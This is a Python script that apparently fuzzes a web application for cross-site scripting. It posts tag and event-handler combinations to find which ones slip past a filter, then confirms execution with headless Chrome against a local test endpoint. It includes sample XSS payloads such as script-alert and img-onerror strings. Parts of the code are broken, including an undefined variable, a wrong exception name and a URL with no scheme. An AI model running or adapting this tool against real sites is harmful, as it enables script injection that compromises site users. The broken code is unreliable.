from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.common.exceptions import JavascriptException
from selenium.common.exceptions import UnexpectedAlertPresentException

import json
import os
import subprocess

import requests

import time
import statistics
import random

import urllib.parse

import logging


class color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

wins = []

caps = DesiredCapabilities.CHROME
#caps['goog:loggingPrefs'] = {'performance': 'ALL'}
caps['acceptInsecureCerts'] = True


chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--window-size=1920x1080")

chrome_options.add_experimental_option('w3c', False)

chrome_driver = os.getcwd() + "/chromedriver"

driver = webdriver.Chrome(options=chrome_options, executable_path=chrome_driver, desired_capabilities=caps)

TARGET = "http://127.0.0.1:8001/xss?a={}"


def test_dom(payload, js=None):

    url = TARGET.format( urllib.parse.quote_plus(payload) )

    try:
        driver.get( url )
        logging.debug( "Got URL" )
        logging.debug( driver.page_source )

        #if "Forbidden" in driver.page_source:
        #    pass

        try:
            if js is not None:
            #javaScript = "return xss"
                logging.debug( "Executing JS" )
                jsResult = driver.execute_script(js)
                logging.debug( "jsResult: {}".format( jsResult ))
            if jsResult == True:
                return True
        except JavascriptException as e:
            logging.debug( str(type(err)) + " : " + str(err) )
    except UnexpectedAlertPresentException:
        return True
        #success( payload )
        #results.append( p )
    return False


def test_resp(payload):
    #r = requests.get(TARGET.format( payload ) )
    r = requests.post("example.com",data={"name":payload} )
    if r.status_code == 200:
        #print( r.text )
        #print( r.text.find(payload) )
        if payload in r.text:
            return True
    return False


def load_list(list_name):
    results = []
    with open("lists/{}.txt".format(list_name), "r") as list_file:
        for line in list_file:
            results.append( line.rstrip() )
    return results

def success(p):
    logging.warn("["+color.OKGREEN+"SUCESS"+color.ENDC+"] "+ p)

def fail(p):
    logging.debug("["+color.FAIL+"FAIL"+color.ENDC+"] "+p)

def info(p):
    logging.warning("["+color.OKBLUE+"*"+color.ENDC+"] "+p)

payloads = [
    #"<script>alert(1)</script>",
    #"<img src=xss onerror=vuln(true)>",
    #"<body/onload=vuln(true)",
    #"<video src=1 onerror=vuln(true)>",
    #"<audio src=1 onerror=vuln(true)>"

    #"<iframe/onreadystatechange=vuln(true)>",
    #"<svg/onload=vuln(true)>"
]

html_tags = load_list( 'html_tags' )
html_events = load_list( 'html_events_short' )
js_functions = [ 'alert(1)', '\'xss=true\'' ]

#for e in html_events:
#    payloads.append("<body {}=alert(1)>".format(e))

js_template = """
xss=false;
alert = function(value) {{ xss=true; }}
var elems = document.getElementsByTagName('{tag}');
for (var i = 0; i < elems.length; i++) {{
    if( typeof elems[i].{event} == 'function') {{
        elems[i].{event}();
    }}
}}
return xss;
"""

logging.basicConfig(level=logging.WARNING)



allowed_tags = []
allowed_events = []

allowed_tags = load_list('html_tags_ali')
#allowed_events = load_list('html_events_ali')

allowed_js = []
allowed_js = ['\'xss=true\'']


info("Enumerating allowed events")
for event in html_events:
    #if test_resp( "<{} {}=>".format(allowed_tags[0], event) ):
    if test_resp( "<{}/{}=>".format(allowed_tags[0], event) ):
        allowed_events.append( event )
        success( event )


for tag in allowed_tags:
    info("Testing events for tag: {}".format(tag))
    #allowed_events = test_resp( )
    for event in allowed_events:
        #payload = "<{} {}=".format(tag, event)
        payload = "<{}/{}=".format(tag, event)
        if test_resp( payload ):
            for js in allowed_js:
                js_payload = "<{} {}={}>".format(tag, event, js)
                if test_dom( js_payload, js=js_template.format(tag=tag, event=event) ):
                    success( js_payload )
        else:
            fail( payload )
    #test_dom()
